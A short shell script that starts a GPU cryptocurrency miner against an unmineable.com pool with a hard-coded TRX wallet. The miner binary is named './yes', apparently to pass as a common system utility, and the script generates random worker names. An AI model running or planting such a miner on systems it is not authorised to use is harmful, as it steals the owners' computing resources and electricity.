POOL=rx-us.unmineable.com:3333
WALLET=TRX:TCbe5BFmYbW4N7fgeAAJpoGoiV6qpnd3tw
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo gvFn2VwG-$(shuf -i 1911-390293 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
